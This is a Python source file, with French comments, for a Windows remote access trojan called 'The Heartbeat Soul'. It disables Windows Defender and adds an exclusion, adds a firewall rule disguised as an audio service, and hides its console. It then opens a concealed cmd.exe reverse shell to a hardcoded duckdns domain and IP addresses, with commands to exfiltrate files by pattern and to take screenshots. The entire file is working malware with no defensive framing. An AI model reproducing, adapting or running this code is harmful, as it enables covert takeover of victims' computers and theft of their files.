# payload.py - NOUVELLE VERSION RENFORCÉE
# The Heartbeat Soul - Connectivité TCP Améliorée et Furtivité

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib
import fnmatch
import struct
import json
import ssl
import urllib.request
import select
import ctypes
import winreg
from datetime import datetime

# --- CONFIGURATION DYNAMIQUE AMÉLIORÉE ---
BACKUP_HOSTS = [
    "sonerdomain.duckdns.org",
    "34.125.23.99",  # Adresse IP de backup 1
    "52.15.183.147", # Adresse IP de backup 2
]

RPORT = 4444
FILE_PORT = RPORT + 1
MAX_RETRIES = 5
RETRY_DELAY = 30

# --- FONCTIONS DE FURTIVITÉ ---
def disable_windows_defender():
    """Désactive Windows Defender temporairement"""
    try:
        # Désactiver la protection en temps réel
        subprocess.run(
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            shell=True,
            capture_output=True
        )
        
        # Ajouter une exclusion pour notre chemin
        implant_path = os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Audio", "Drivers")
        subprocess.run(
            f'powershell -Command "Add-MpPreference -ExclusionPath \'{implant_path}\'"',
            shell=True,
            capture_output=True
        )
        
        # Désactiver les notifications
        subprocess.run(
            'powershell -Command "Set-MpPreference -UILockdown $true"',
            shell=True,
            capture_output=True
        )
    except:
        pass

def add_firewall_exception():
    """Ajoute une exception au firewall Windows"""
    try:
        rule_name = "Windows Audio Service"
        
        # Créer une règle de firewall
        firewall_cmd = (
            f'netsh advfirewall firewall add rule name="{rule_name}" '
            f'dir=out action=allow protocol=TCP localport=any '
            f'enable=yes profile=any'
        )
        subprocess.run(firewall_cmd, shell=True, capture_output=True)
    except:
        pass

def get_active_host():
    """Trouve un hôte actif parmi les backups"""
    for host in BACKUP_HOSTS:
        try:
            # Test de connectivité simple
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((host, RPORT))
            sock.close()
            
            if result == 0:
                return host
        except:
            continue
    
    # Si aucun hôte ne répond, utiliser le DNS dynamique
    try:
        # Résoudre le DNS dynamique
        ip = socket.gethostbyname(BACKUP_HOSTS[0])
        return ip
    except:
        return BACKUP_HOSTS[0]  # Retourner quand même

# --- FONCTIONS DE COMMUNICATION AMÉLIORÉES ---
def create_encrypted_socket():
    """Crée un socket avec chiffrement optionnel"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        
        # Essayer le chiffrement SSL
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            encrypted_sock = context.wrap_socket(sock, server_hostname=get_active_host())
            return encrypted_sock
        except:
            return sock  # Retourner le socket normal si SSL échoue
    except:
        return None

def send_msg(sock, data):
    """Envoie des données avec en-tête de longueur"""
    try:
        if not sock:
            return False
            
        msg = struct.pack('>I', len(data)) + data
        sock.sendall(msg)
        return True
    except:
        return False

def recv_msg(sock, timeout=10):
    """Reçoit des données avec timeout"""
    try:
        if not sock:
            return None
            
        sock.settimeout(timeout)
        raw_msglen = sock.recv(4)
        if not raw_msglen:
            return None
            
        msglen = struct.unpack('>I', raw_msglen)[0]
        data = b''
        
        while len(data) < msglen:
            packet = sock.recv(min(msglen - len(data), 4096))
            if not packet:
                return None
            data += packet
            
        return data
    except socket.timeout:
        return b'TIMEOUT'
    except:
        return None

# --- SYSTÈME DE TRANSFERT DE FICHIERS MULTI-THREAD ---
class FileTransferManager:
    """Gère les transferts de fichiers avec reprise sur erreur"""
    
    def __init__(self):
        self.active_transfers = {}
        self.lock = threading.Lock()
    
    def transfer_file(self, file_path, remote_host, remote_port):
        """Transfère un fichier avec vérification d'intégrité"""
        try:
            file_size = os.path.getsize(file_path)
            file_hash = self.calculate_hash(file_path)
            
            if not file_hash:
                return False
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((remote_host, remote_port))
            
            # Envoyer les métadonnées
            metadata = {
                'path': os.path.basename(file_path),
                'size': file_size,
                'hash': file_hash,
                'timestamp': datetime.now().isoformat()
            }
            
            if not send_msg(sock, json.dumps(metadata).encode()):
                return False
            
            # Transférer le fichier par morceaux
            with open(file_path, 'rb') as f:
                transferred = 0
                while transferred < file_size:
                    chunk = f.read(8192)
                    if not chunk:
                        break
                    
                    sock.sendall(chunk)
                    transferred += len(chunk)
            
            # Vérifier l'acquittement
            ack = recv_msg(sock, timeout=5)
            sock.close()
            
            return ack == b'ACK'
        except:
            return False
    
    def calculate_hash(self, file_path):
        """Calcule le hash SHA-256 d'un fichier"""
        sha = hashlib.sha256()
        try:
            with open(file_path, 'rb') as f:
                for block in iter(lambda: f.read(4096), b''):
                    sha.update(block)
            return sha.hexdigest()
        except:
            return None

# --- COMMAND HANDLER AVANCÉ ---
class CommandHandler:
    """Gère les commandes avec fonctionnalités avancées"""
    
    def __init__(self, main_socket):
        self.socket = main_socket
        self.file_manager = FileTransferManager()
        self.running = True
    
    def handle_pfiler(self, command):
        """Gère la commande pfiler améliorée"""
        try:
            parts = command.split()[1:]
            if not parts:
                return False
            
            # Analyse des arguments
            search_path = parts[0] if len(parts) > 1 and os.path.isdir(parts[0]) else "."
            patterns = parts[1:] if len(parts) > 1 and os.path.isdir(parts[0]) else parts
            
            # Recherche de fichiers
            found_files = []
            for root, _, files in os.walk(search_path, onerror=lambda e: None):
                for pattern in patterns:
                    for file in files:
                        if fnmatch.fnmatch(file, pattern):
                            full_path = os.path.join(root, file)
                            try:
                                if os.access(full_path, os.R_OK):
                                    found_files.append(full_path)
                            except:
                                continue
            
            # Transférer les fichiers
            if found_files:
                self.socket.sendall(f"Found {len(found_files)} files. Starting transfer...\n".encode())
                
                for file_path in found_files:
                    success = self.file_manager.transfer_file(
                        file_path, 
                        get_active_host(), 
                        FILE_PORT
                    )
                    
                    if success:
                        self.socket.sendall(f"Transferred: {os.path.basename(file_path)}\n".encode())
                    else:
                        self.socket.sendall(f"Failed: {os.path.basename(file_path)}\n".encode())
            
            return True
        except:
            return False
    
    def handle_screenshot(self):
        """Prend une capture d'écran"""
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            
            # Sauvegarder temporairement
            temp_path = os.path.join(os.getenv('TEMP'), 'screenshot.png')
            screenshot.save(temp_path)
            
            # Transférer
            success = self.file_manager.transfer_file(
                temp_path,
                get_active_host(),
                FILE_PORT
            )
            
            # Nettoyer
            if os.path.exists(temp_path):
                os.remove(temp_path)
            
            return success
        except:
            return False
    
    def handle_keylogger(self, action):
        """Active/désactive le keylogger"""
        # À implémenter selon les besoins
        pass

# --- REVERSE SHELL PRINCIPAL ---
def run_conduit():
    """Boucle principale du reverse shell améliorée"""
    
    # Configuration initiale
    disable_windows_defender()
    add_firewall_exception()
    
    retry_count = 0
    
    while retry_count < MAX_RETRIES:
        try:
            host = get_active_host()
            print(f"[*] Connecting to {host}:{RPORT}")
            
            sock = create_encrypted_socket()
            if not sock:
                raise ConnectionError("Failed to create socket")
            
            sock.connect((host, RPORT))
            print(f"[+] Connected to {host}:{RPORT}")
            
            # Envoyer les informations système
            system_info = {
                'hostname': socket.gethostname(),
                'username': os.getenv('USERNAME'),
                'os': os.name,
                'timestamp': datetime.now().isoformat()
            }
            
            send_msg(sock, json.dumps(system_info).encode())
            
            # Lancer le shell
            process = subprocess.Popen(
                ["cmd.exe"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            handler = CommandHandler(sock)
            
            # Thread pour la sortie du processus
            def read_output(stream, connection):
                while handler.running:
                    try:
                        data = stream.read(1)
                        if data:
                            connection.sendall(data)
                    except:
                        break
            
            # Lancer les threads de lecture
            threading.Thread(target=read_output, args=(process.stdout, sock), daemon=True).start()
            threading.Thread(target=read_output, args=(process.stderr, sock), daemon=True).start()
            
            # Boucle principale de commandes
            while handler.running:
                try:
                    data = sock.recv(1024)
                    if not data:
                        break
                    
                    command = data.decode('utf-8', errors='ignore').strip()
                    
                    # Commandes spéciales
                    if command.lower().startswith('pfiler '):
                        handler.handle_pfiler(command)
                    elif command.lower() == 'screenshot':
                        handler.handle_screenshot()
                    elif command.lower().startswith('keylogger'):
                        handler.handle_keylogger(command)
                    elif command.lower() == 'exit':
                        handler.running = False
                        break
                    else:
                        # Commandes normales
                        process.stdin.write(data + b'\n')
                        process.stdin.flush()
                        
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print(f"[-] Command error: {e}")
                    break
            
            # Nettoyage
            handler.running = False
            process.terminate()
            sock.close()
            
            # Réinitialiser le compteur de tentatives en cas de succès
            retry_count = 0
            
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            retry_count += 1
            
            if retry_count < MAX_RETRIES:
                delay = RETRY_DELAY * retry_count
                print(f"[*] Retrying in {delay} seconds...")
                time.sleep(delay)
            else:
                print("[!] Max retries reached. Exiting.")
                break

# --- POINT D'ENTRÉE PRINCIPAL ---
if __name__ == "__main__":
    # Cacher la console
    if sys.platform == "win32":
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
    
    # Lancer le reverse shell
    run_conduit()